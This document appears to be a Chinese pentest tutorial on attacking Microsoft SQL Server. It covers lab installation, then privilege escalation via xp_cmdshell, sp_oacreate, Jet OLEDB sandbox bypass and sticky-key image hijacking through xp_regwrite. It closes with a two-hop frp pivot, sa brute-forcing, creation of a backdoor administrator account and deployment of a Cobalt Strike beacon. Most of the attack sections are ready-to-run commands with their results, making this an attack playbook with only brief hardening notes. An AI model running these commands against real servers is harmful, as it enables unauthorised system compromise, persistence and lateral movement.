0x01 MSSQL数据库介绍
---------------

MSSQL数据库，全称MicroSoft SQL Server，是微软开发的关系型数据库管理系统DBMS，提供数据库的从服务器到终端的完整的解决方案。数据库管理系统`SSMS(SQL Server Managerment Studio)`，是一个用于建立、使用和维护数据库的集成开发环境。

### 1、SA用户介绍

在搭建时，选择使用`SQL Server`身份验证会创建SA账户并设置密码，`SA(System Administrator)` 表示系统管理员，在`SQLServer2019`之前的SA用户都是系统最高权限用户`SYSTEM`，但在2019版本时为普通数据库用户`mssqlserver`，是一个低权用户。

### 2、MSSQL权限级别

1. sa权限：数据库操作，文件管理，命令执行，注册表读取等价于system，SQLServer数据库的最高权限
2. db权限：文件管理，数据库操作等价于 users-administrators
3. public权限：数据库操作等价于 guest-users

### 3、存储过程

MSSQL的存储过程是一个可编程的函数，它在数据库中创建并保存，是使用T\_SQL编写的代码段，目的在于能够方便的从系统表中查询信息。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式，使用`execute`命令执行存储过程。（可以将存储过程理解为函数调用的过程）

简单来说，存储过程就是一条或者多条sql语句的集合，可视为批处理文件

存储过程可分为三类：  
**系统存储过程：**  
主要存储在master数据库中，以"**sp\_**"为前缀，在任何数据库中都可以调用，在调用的时候不必在存储过程前加上数据库名  
**扩展存储过程：**  
是对动态链接库(DLL)函数的调用，主要是用于客户端与服务器端或客户端之间进行通信的，以“**xp\_**"为前缀，使用方法与系统存储过程类似  
**用户定义的存储过程：**  
是SQLServer的使用者编写的存储过程

### 4、系统数据库

系统数据库默认创建时就会存在，有以下4种

![2shcQS.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-49cd17bee4d011454b8669ea381dc21d81246370.png)

| 数据库名 | 含义 |
|---|---|
| master | master数据库控制SQLserver数据库所有方面。这个数据库中包括了所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息等。 |
| model | model数据库是建立所有用户数据库时的模版。新建数据库时，SQLserver会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模版对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。 |
| msdb | msdb数据库是SQLserver数据库中的特例，若想查看此数据库的实际定义，会发现它其实是一个用户数据库。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQLserver agent将会使用这个库。 |
| tempdb | 据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。 |

### 5、MSSQL注入

MSSQL注入与普通的MYSQL注入类似，但在数据结构特定函数名称上有些差异。而使用经过语法扩展的T-SQL语句，在实现更为复杂的业务的同时，也带来了安全上的危险。因此MSSQL在后续提权部分，与MYSQL有着较大的差异。由于该数据库与Windows平台的高契合度，使其可以使用Windows身份验证（或SA管理员账号），这就导致其运行权限较高。因此，若后续权限没有限制准确，WEB代码又存在SQL注入时，就会给整个服务器的安全带来严重威胁，其后果一般比Mysql被攻破要严重。

0x02 MSSQL 数据库安装&amp;环境配置
-------------------------

### 1、MSSQL 2019版本数据库安装

#### 1）环境选择

选择`Win2016`加上`MSSQL2019`

#### 2）下载地址

下载地址：<https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads>

选择SQL Server 2019 Express Edition版本，安装过程百度即可，这里记录其中较关键的地方：

```php
安装类型选择-基本(B)
实例配置选择-默认实例
服务器配置选择-混合模式(SQL Server身份验证和Windows 身份验证)(M)
    配置SQL Server系统管理员SA的密码（我设置密码为123.com）
```

#### 3）安装SSMS

安装完SQL Server Express版本后，可以直接选择安装`SSMS`

![2sh2LQ.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-95c37ce91fe24440822f1a7ffb5a5e01f2c708ab.png)

```php
在点击"安装SSMS"弹出网页内选择下载SSMS
点击该程序，默认安装即可
```

### 2、MSSQL 2008 x64版本数据库安装

#### 1）环境选择

选择`Win2016`和`MSSQL2008`

#### 2）下载地址

下载地址：<https://www.microsoft.com/zh-CN/download/d> etails.aspx?id=30438

下载如图两个文件

![2shWZj.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7186ced2fec780e3ea22ea4bae1a34f39caa6e3f.png)

#### 3）安装SQLEXPR\_x64\_CHS.exe

基本安装过程类似2019的，记录下重要部分

```php
选择-全新安装
实例配置选择-默认实例
服务器配置选择-混合模式(SQL Server身份验证和Windows 身份验证)(M)
    配置SQL Server系统管理员SA的密码（我设置密码为123.com）
```

#### 4）安装SQLManagementStudio\_x64\_CHS.exe

提示没有安装`.NET3.5`，按下文步骤即可  
<https://www.cnblogs.com/labster/p/14863516.html>

之后选择全新安装，默认下一步即可

### 3、MSSQL 2008 x32版本数据库安装

#### 1）环境选择

选择`Win2003`加上`MSSQL2008`

#### 2）下载地址

下载地址：<https://www.microsoft.com/zh-CN/download/d> etails.aspx?id=30438

#### 3）踩坑记录

这里的32位系统环境用于复现第四部分的沙盒漏洞提权，相较于前两个数据库的安装，这里遇到了不少坑，较详细介绍下。使用`Win2003 x32`系统作为复现操作系统，由于年代久远加上03系统装08软件，记录下几个坑点。

Ⅰ. 启动`SQLEXPR_x86_CHS.exe`提示缺失程序

![2sh5iq.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4cc73ada68bfe323e8954ee1fb6a759bac48e515.png)

Ⅱ. 安装`.NET 3.5`

慢慢等待5分钟

![2shIJ0.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-91ec83c4ff258437e2ac9b8179aa115c1a9e8e30.png)

Ⅲ. 安装`Windows_Installer4.5x86.exe`

默认下一步

![2shoWV.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f6e920a6652ba51f6a4cee93e9ae2b74c25140a6.png)

Ⅳ. 安装`powershell2003x86-CHS.exe`

![2shTzT.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-474e5c864847ee64027f3567319850e025f2340c.png)

其余安装过程类似，就不详细介绍了，附上安装工具包：

```php
https://pan.baidu.com/s/15CngCBWign9fY1IrSt4_jg
密码：fm4v
```

0x03 MSSQL数据库基处操作
-----------------

### 1、使用SSMS连接MSSQL数据库

连接本地数据库，在之前的设置中，我们设置了混杂模式，即可以使用SQL Server 身份验证或 Windows 身份验证登陆进数据库，点击启动`SSMS`

服务器名称可以填写主机名或本地ip地址  
登录名和密码为`sa:123.com`

![2shqL4.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dd47c923dfcf272054377b2b84e2c7df9e23656b.png)

> 注意点：可以一开始会出现使用主机名可以登入上，但是使用ip登入不上的情况可以参考如下文章解决  
> [https://blog.csdn.net/weixin\_30740295/article/d](https://blog.csdn.net/weixin_30740295/article/d) etails/95535927

### 2、MSSQL设置允许通过ip登陆

（以2019版本为例，其余版本类似）

#### 1）打开配置管理器

![2shXw9.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a179efcf697740aadde002536763070a0cbf5b1f.png)

#### 2）协议TCP/IP设置为开启

在`SQL Server 网络配置`下的`MSSQLSERVER的协议`里启用`TCP/IP协议`

![2shbyF.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-358e47e236625c2cf1d881e76ddac274f796e2e1.png)

#### 3）开启远程登陆

先用主机名进行登陆

右键，打开数据库的属性

![2shOeJ.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a1ce215f0845939952597d41c78f2ae0b3aaa6af.png)

在`连接`处勾选`允许远程连接到此服务器`

![2shjoR.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7cdaeb604bf817ca4762d3ae946e3a4f8a66ef64.png)

#### 4）关闭防火墙

这里用于渗透测试，直接全部关了

![2s4keH.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-61825c817573ad70c10c8e4de8c71ffecc6da151.png)

#### 5）重启SSMS服务

打开管理员模式下的CMD

```php
net stop mssqlserver
net start mssqlserver
```

之后就可以使用IP进行登陆

![2s4iOe.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5de28708b01c66eaef3a06ec30d6aa8ed1882185.png)

### 3、MSSQL数据库常见语句

右键系统数据库，新建查询

![2s4CQO.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7342562761a299cb5343599abf4d8a634aa8e561.png)

#### 1）查看数据库版本

```sql
select @@VERSION
```

#### 2）获取MSSQL中的所有数据库名

```sql
SELECT name FROM MASter..SysDatab ASes ORDER BY name  
```

#### 3）查询所有数据库中的表名

```sql
SELECT SysO bjects.name AS Tablename FROM sysO bjects WHERE xtype = 'U' and sysstat<200
```

其余见MSSQL基础学习部分，自行百度

```sql
exec xp_dirtree 'c:'        # 列出所有c:\文件、目录、子目录
exec xp_dirtree 'c:',1      # 只列c:\目录
exec xp_dirtree 'c:',1,1    # 列c:\目录、文件
exec xp_subdirs 'C:';       # 只列c:\目录
select is_srvrolemember('sysadmin') # 判断是否是SA权限
select is_member('db_owner')        # 判断是否是db_owner权限  
select is_srvrolemember('public')   # 判断是否是public权限
EXEC sp_configure 'Ole Automation Procedures'   #查看OLE Automation Procedures的当前设置
```

0x04 MSSQL渗透测试及漏洞复现
-------------------

### 1、使用xp\_cmdshell进行提权

> xp\_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除

#### 1）xp\_cmdshell简介

`xp_cmdshell`是`Sql Server`中的一个组件，将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出。通常在拿到sa口令之后，可以通过`xp_cmdshell`来进行提权

**影响范围：**

只要该数据库存在该组件，就可以利用

#### 2）xp\_cmdshell使用

##### Ⅰ 查看xp\_cmdshell状态

```sql
select count(*) from master.dbo.sysO bjects where xtype='x' and name='xp_cmdshell'
```

返回1表示`xp_cmdshell`组件**启用**

也可以手动查看，右键数据库，打开`Facets`

![2s4SW6.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-13c315ebccc1da788eb8cd7bb1d78230f70c34dd.png)

在方面中选择`外围应用配置器`，在方面属性中查看`XPCmdShellEnabled`属性为`True`

![2s49SK.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-27c16ac45a82b758ec7b8f8c4521aff51ff0bc04.png)

##### Ⅱ 开启xp\_cmdshell组件

```sql
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

![2s4PyD.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-07a9fb9804aeb669fcbcd2ec6fb8da316cf31687.png)

同样，关闭该组件的命令为

```sql
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',0
RECONFIGURE
```

##### Ⅲ 利用xp\_cmdshell执行命令

- **执行系统命令**

以下几条命令格式都可以用于执行系统命令

```sql
exec xp_cmdshell "whoami"
master..xp_cmdshell 'whoami'    (2008版上好像用不了)
EXEC master..xp_cmdshell "whoami"
EXEC master.dbo.xp_cmdshell "ipconfig"
```

![2shzJx.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a863aeef35019ceddf5998fc3538635b72725874.png)

> 注意点：  
> 在MSSQL2019版本中，会使用mssqlserver用户而非system用户

#### 3）模拟实战：远程命令执行创建用户

这里通过演示远程命令执行来模拟实战情况，远程MSSQL数据库版本为2008版  
环境信息：

```php
远程MSSQL数据库的IP：192.168.112.166
```

假设已经爆破得到了sa密码

##### 创建用户联合wmiexec拿到shell

```php
exec master..xp_cmdshell "net user test12 123.com /add"
exec master..xp_cmdshell "net localgroup administrators test12 /add"
exec master..xp_cmdshell "net user test12"
```

![2s4Jkn.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-662551d6a0c7765cf56db0ca13fffbdac25ec074.png)

可以看到用户添加成功

![2s4QOg.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2de17b3e1cfa48b3d689a7c5443a24d77329add1.png)

后续可以登陆用户上传木马，上线CS，详情见本文**第五部分：二级内网MSSQL渗透|上线CS**

#### 4）保护措施

将该`xp_cmdshell`存储过程删除即可

```php
exec sp_dropextendedproc 'xp_cmdshell' 
```

被删除后，重新添加`xp_cmdshell`存储过程语句

```text
EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int;
sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll';
```

若想彻底删除`xp_cmdshell`扩展存储过程，建议在C盘里直接搜索`xplog70.dll`，然后删除`xp_cmdshell`。

### 2、使用sp\_oacreate进行提权|无回显

#### 1）sp\_oacreate简介

> 调用ws cript.shel执行命令

`sp_oacreate`系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合`sp_oamethod`系统存储过程调用系统`ws cript.shell`来执行系统命令。`sp_oacreate`和`sp_oamethod`两个过程分别用来创建和执行脚本语言。

系统管理员使用`sp_configure`启用`sp_oacreate`和`sp_oamethod`系统存储过程对OLE自动化过程的访问（OLE Automation Procedures）

在效果方面，`sp_oacreate、sp_oamethod`两个过程和`xp_cmdshell`过程功能类似，因此可以替换使用！

**利用条件：**

1. 已获取到sqlserver sysadmin权限用户的账号与密码且未降权（如2019版本sa用户权限为mssqlserver，已降权）
2. sqlserver允许远程连接
3. OLE Automation Procedures选项开启

#### 2）sp\_oacreate使用

##### Ⅰ 查看sp\_oacreate状态

```php
select count(*) from master.dbo.sysO bjects where xtype='x' and name='SP_OACREATE';
```

返回1表示存在`sp_oacreate`系统存储过程

##### Ⅱ 启用OLE Automation Procedures选项

当启用 OLE Automation Procedures 时，对 sp\_OACreate 的调用将会启动 OLE 共享执行环境。

```php
exec sp_configure 'show advanced options',1;
reconfigure;
exec sp_configure 'Ole Automation Procedures',1;
reconfigure;
```

![2s43wj.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cc57619c62660affbd105669de58e4932a4c46d6.png)

类似的，关闭组件命令

```php
exec sp_configure 'show advanced options',1;
reconfigure;
exec sp_configure 'Ole Automation Procedures',0;
reconfigure;
```

##### Ⅲ 利用sp\_oacreate和sp\_oamethod执行命令

- 写入文件

```php
declare @shell int exec sp_oacreate 'ws cript.shell',@shell output 
exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\sqltest.txt';
```

回显0表示成功

![2s41mQ.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e974fd866c4c6612404b88c0aedb20e7e590eba5.png)

由于这里是无回显的命令执行，到另一台主机上查看效果，成功写入。

![2s48Ts.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-000d8dab5a66d01957a0f9e3651875b89d4af00f.png)

- 删除文件

```php
declare @result int
declare @fso_token int
exec sp_oacreate 's cripting.filesystemO bject', @fso_token out
exec sp_oamethod @fso_token,'deletefile',null,'c:\sqltest.txt'
exec sp_oadestroy @fso_token
```

![2s4tf0.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-780f15b8120191e2f22f1f3d3e80c1359f2121a4.png)

可以看到文件已删除

![2s4YYq.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cb6ffe13fe51b449a3912fc5b36ae219206f7fce.png)

同样，也可以使用4.1中的创建用户进行登陆拿shell。

### 3、利用SQL Server沙盒提权

#### 1）SQL Server 沙盒简介

沙盒模式是一种安全功能，用于限制数据库只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性（如Kill 和 Shell 之类的函数），则可认为它是安全的。当数据库以沙盒模式运行时，调用这些函数的表达式将会产生错误消息。

沙盒提权的原理就是`jet.oledb`（修改注册表）执行系统命令。数据库通过查询方式调用`mdb`文件，执行参数，绕过系统本身自己的执行命令，实现`mdb`文件执行命令。

**利用前提：**

1. 需要`Microsoft.Jet.OLEDB.4.0`  
    一般在32位系统才可以，64位机需要12.0，较复杂
2. `dnary.mdb`和`ias.mdb`两个文件  
    在`win2003`上默认存在，也可自行准备

#### 2）沙盒提权

复现环境

```php
SQL Server2008 (Win2003-x32)
IP: 192.168.112.173
```

##### Ⅰ 测试 jet.oledb 能否使用

```php
select * from openrowset('microsoft.jet.oledb.4.0',';datab ASe=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c whoami")')
```

![2s42p6.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b37bc3c22ae75d4594c644f322bb2863ded8d7e0.png)

##### Ⅱ 开启Ad Hoc Distributed Queries组件

```php
exec sp_configure 'show advanced options',1 ;
reconfigure ;
exec sp_configure 'Ad Hoc Distributed Queries',1 ;
reconfigure;
```

![2s4cfx.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-06116edeec252b4ddf7ead7c248b69efc10cc960.png)

类似的，关闭组件命令

```php
exec sp_configure 'show advanced options',1 ;
reconfigure ;
exec sp_configure 'Ad Hoc Distributed Queries',0 ;
reconfigure;
```

##### Ⅲ 关闭沙盒模式

```php
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;

沙盒模式`SandBoxMode`参数含义（默认是2）
0：在任何所有者中禁止启用安全模式
1：为仅在允许范围内
2：必须在access模式下
3：完全开启
```

![2s4D0J.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-795bb1ba26bdaf5a0e6f539ce27dd9f84eb2a41c.png)

查看命令：

```php
exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'
```

关闭命令：

```php
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',2
```

##### Ⅳ 执行命令

```php
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Datab ASe=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c whoami >c:\\sqltest.txt ")');
```

在win2003的c盘上看到已经创建了该文件，命令执行成功

![2s4Bm4.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b3bf2532a83c2072303157796a4a4b629d0eeddb.png)

同样，可以创建用户

```sql
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Datab ASe=c:\windows\system32\ias\ias.mdb','select shell("net user testq QWEasd123 /add")');

Select * From OpenRowSet('microsoft.jet.oledb.4.0',';Datab ASe=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators testq /add")');

Select * From OpenRowSet('microsoft.jet.oledb.4.0',';Datab ASe=c:\windows\system32\ias\ias.mdb','select shell("net user testq")');
```

### 4、使用xp\_regwrite提权 | 映像劫持提权

> 2008以上，05未测试

#### 1）xp\_regwrite提权简介

通过使用`xp_regwrite`存储过程对注册表进行修改，替换成任意值，造成镜像劫持。

前提条件：

1. 未禁止注册表编辑（即写入功能）
2. xp\_regwrite启用

#### 2）映像劫持提权

##### Ⅰ 查看xp\_regwrite是否启用

```sql
select count(*) from master.dbo.sysO bjects where xtype='x' and name='xp_regwrite'
```

##### Ⅱ xp\_regwrite开启与关闭

```sql
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_regwrite',1
RECONFIGURE
```

##### Ⅲ 利用regwrite函数修改组注册表进行劫持

```sql
EXEC master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:\windows\system32\cmd.exe'
```

![2s4ykR.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7b79dd8c8109e8d17f61c89bb81b4419644a1b3c.png)

##### Ⅳ 查看是否修改成功文件

```sql
exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
```

![2s4r79.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6d447d2f92d8da3e9d23c829504d307387c095b1.png)

显示已修改为`cmd.exe`

在目标主机上查看，结果一致

![2s46t1.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-69f50d7e1b7cd8987e16714dd2c4c68f5ec38155.png)

##### Ⅴ 验证是否成功

连按5次粘滞键，弹出cmd框

![2s4W6O.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1f584575931575090ba2eb99bfaa950491971885.png)

**拓展：**

上面对只是对粘滞键进行修改，类似的，可以在注册表中进行其他操作

- **删除指定注册表键值对**

删除粘滞键的键值

```php
xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'
```

![2s44ne.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3d9d823b68e50a83a6424d7aa8a49990bc07cb8f.png)

到目标主机上查看，发现sethc.exe在注册表中的值已删除

![2s4fXD.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e751fefd30e7e632eb216e9282b3574423d58406.png)

- **开启3389端口**  
    这里的`xp_regwrite`为向注册表中写数据

```sql
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;

exec master..xp_cmdshell "REG ADD 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0"
```

![2s450H.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c578d5bc9d8777eb4add9e0b45a5b8a20cec57e9.png)

在注册表中也可以看到3389端口被打开

![2s4I7d.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b8d69d611f218ef627eb1b50133c283670caf34e.png)

#### 3）参考

[https://sqlandme.com/tag/xp\_regwrite/](https://sqlandme.com/tag/xp_regwrite/)

[IFEO映像劫持在实战中的使用 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/96504762)

### 5、使用sp\_makewebtask写文件

> 2005

一般可以用于web网站，写入后门文件

#### 1）查看该组件

```php
EXEC sp_configure 'Web Assistant Procedures'
```

#### 2）开启该组件

```php
exec sp_configure 'Web Assistant Procedures', 1; RECONFIGURE
```

报错，在SQLServer2005后好像都没有这个组件了

### 6、拓展&amp;小结

常见的存储过程：

```php
xp_cmdshell         执行系统命令
xp_fileexist        确定一个文件是否存在。
xp_getfiled etails  获得文件详细资料。
xp_dirtree          展开你需要了解的目录，获得所有目录深度。
Xp_getnetname       获得服务器名称。

注册表访问的存储过程
Xp_regwrite
Xp_regread
Xp_regdeletekey
Xp_regaddmultistring
Xp_regdelete value
Xp_regenumvalues
Xp_regremovemultistring

OLE自动存储过程
Sp_OACreate Sp_OADestroy Sp_OAGetErrorInfo Sp_OAGetProperty
Sp_OAMethod Sp_OASetProperty Sp_OAStop  
```

0x05 二级内网MSSQL渗透|上线CS
---------------------

这里模拟搭建二级内网环境，顺便复习下二级frp代理的搭建和内网穿透上线CS。环境配置信息如下

```php
公网服务器
121.xx.xx.xx

Web服务器(目标站点)
192.168.73.137(对外)
10.10.10.101(对内)

域控
10.10.10.10
10.12.10.5

MSSQL服务器
10.12.10.3
```

这里假设已经获取到了**Web服务器和域控**的权限

### 1、搭建二级代理

1）在域控上传`frpc.exe`和`frpc.ini`文件

```php
#frpc.ini
[common]
server_addr = 10.10.10.101
server_port = 12010     # 连接端口
[http_proxy]
type = tcp
remote_port = 1084      # 代理端口
plugin = socks5
```

2）在Web服务器上传`frpc.exe、frpc.ini、frps.exe、frps.ini`文件

```php
# frps.ini
[common]
bind_addr = 10.10.10.101
bind_port = 12010 

# frpc.ini
[common]
server_addr = 121.xx.xx.xx
server_port = 12010
[http_proxy]
type = tcp
local_ip = 10.10.10.101
local_port = 1084
remote_port = 1084
```

3）在公网服务器上传`frps.exe`和`frps.ini`

```php
#frps.ini
[common]
bind_addr = 0.0.0.0
bind_port = 12010 
```

4）依次连接（由内到外）

```php
web服务器
frps.exe -c frps.ini
域控
frpc.exe -c frpc.ini

公网服务器
frps.exe -c frps.ini
web服务器
frpc.exe -c frpc.ini
```

### 2、爆破sa密码

使用fscan扫描，顺便进行弱口令爆破，成功爆破出sa密码

![2s4z7j.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b284fc3fbe40f10d0dd4239962e6dda8f35813bd.png)

也可以使用msf模块爆破

### 3、设置代理|远程登陆MSSQL

使用Proxifier设置代理，添加代理服务器信息

![2s4xBQ.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c34dd6f99565c852285dadd1b9cbddf6608ec0e4.png)

连接MSSQL数据库

![2s4vng.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-859492007aef52aa4cad76aa29671f2792486cfd.png)

成功连接！！

![2s4XjS.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1a0902eca484e17fe106ab23667f975628986254.png)

### 4、使用xp\_cmdshell创建用户

> 这里也可以使用其他方法命令执行

**1）查看开启xp\_cmdshell组件**

```php
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

![2s4Oc8.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e6a7edf229d7e0fb8075c9651a370e10f1da4a7b.png)

**2）查看当前权限**

```php
exec master..xp_cmdshell "whoami"
```

![2s47tI.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b70eb0a44b7c28f6936ba101fd9e1a37e0d1f26f.png)

system权限，可以创建用户

**3）创建用户并添加至管理员组**

创建`sqltest`用户，密码为`123.com`

```php
exec master..xp_cmdshell "net user test12 123.com /add"
exec master..xp_cmdshell "net localgroup administrators test12 /add"
exec master..xp_cmdshell "net user test12"
```

![2s4Hht.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d41952b3942c6563f760c88a6efc3bee9c884b7c.png)

**4）CS生成后门文件（中转监听器）**

在域控上建立中转监听器

![2s4TAA.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d6211df3e4678c899d3cac3fe9753bc9b47faf92.png)

![2s5Dv8.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-310e1866c46da5901d71a8aa326f3bd5525e9909.png)

将生成好后的文件拷贝到kali上

**5）使用wmiexec工具远程登陆**

```php
proxychains python3 wmiexec.py tset12:123.com@10.12.10.3
```

上传木马文件

![2s4q9P.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6cfc611d83c32dd78f7e1e423f86f4d364a87390.png)

**6）成功上线CS**

![2s4L1f.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ef61f137dc964986d326275e8185f302fce1b51c.png)